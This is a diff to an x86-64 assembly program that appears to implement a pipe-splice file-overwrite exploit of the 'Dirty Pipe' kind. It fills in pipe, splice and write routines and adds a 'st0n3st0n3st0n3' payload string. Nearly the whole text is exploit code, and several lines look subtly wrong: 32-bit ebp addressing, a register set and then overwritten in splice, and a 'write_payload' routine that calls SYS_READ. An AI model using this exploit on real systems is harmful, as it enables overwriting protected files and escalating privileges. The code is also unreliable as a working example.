@@ -6,7 +6,7 @@ _start:
     call main
 
 main:
-    sub rsp, 32+4096+65536
+    sub rsp, 8+65536
 
 ; *******************
 ; open
@@ -38,8 +38,8 @@ prepare_pipe:
 ; *******************
 write: 
     mov rdx, PAGE_SIZE
-    mov rsi,                            ;buffer
-    mov rdi,                            ; p[1]
+    lea rsi,  [ebp-65536]                         ;buffer
+    mov rdi, [ebp-65536-4]                           ; p[1]
     mov rax, SYS_WRITE
     syscall
 
@@ -49,8 +49,8 @@ write:
 ; *******************
 read: 
     mov rdx, PAGE_SIZE
-    mov rsi,                            ;buffer
-    mov rdi,                            ; p[0]
+    lea rsi,   [ebp-65536]                         ;buffer
+    lea rdi,  [ebp-65536-8]                          ; p[0]
     mov rax, SYS_READ
     syscall
 
@@ -61,7 +61,7 @@ splice:
     mov r9, 0                                                     ; flags
     mov r8, 1                                                     ; len
     mov rcx, NULL                                           ; off_out
-    mov rdx,                                                      ; p[1]
+    lea rdi, [ebp-65536-4]                                                    ; p[1]
     mov rsi,   0                                                  ; offset
     mov rdi,  qword [fileDesc]                          ; fd
     mov rax, SYS_SPLICE
@@ -73,8 +73,8 @@ splice:
 ; *******************
 write_payload: 
     mov rdx, MAX_LENGTH                     ; length
-    mov rsi,                                                ; payload
-    mov rdi,                                                ; p[1]
+    mov rsi,   payload                                             ; payload
+    lea rdi, [ebp-65536-4]                                             ; p[1]
     mov rax, SYS_READ
     syscall
 
@@ -125,6 +125,7 @@ section .data
     errMsgOpen         db    "Error opening the file.", LF, NULL
     errMsgRead         db    "Error reading from the file.", LF, NULL
     fileDesc       dq       0
+    payload db "st0n3st0n3st0n3"
 
 section    .bss
 readBuffer resb     BUFF_SIZE
